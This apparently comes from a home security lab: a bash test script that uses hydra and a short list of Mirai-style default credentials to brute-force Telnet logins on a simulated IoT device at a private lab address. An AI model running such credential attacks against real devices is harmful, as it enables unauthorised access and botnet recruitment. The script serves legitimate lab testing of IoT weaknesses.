#!/bin/bash
# Test 6/10: Telnet credential brute-force against IoT-Sim's open Telnet
# service (BusyBox telnetd on port 2323), modeled on the Mirai default-
# credential attack pattern.
# Run from Kali-Attacker. Requires hydra:
#   sudo apt install -y hydra
#
# Note: BusyBox telnetd under automated brute-force conditions can be slow
# or appear to hang on individual attempts (observed ~60s timeout per
# connection in this lab) — see FINDINGS.md test #6/#10 for detail. Allow
# several minutes for a full run, or interrupt (Ctrl+C) after a couple of
# minutes if only a partial-attempt sample is needed.

TARGET="192.168.30.20"
PORT="2323"

cat > creds.txt << 'EOF'
admin:admin
root:root
admin:1234
root:12345
admin:password
EOF

hydra -C creds.txt -s "$PORT" "$TARGET" telnet
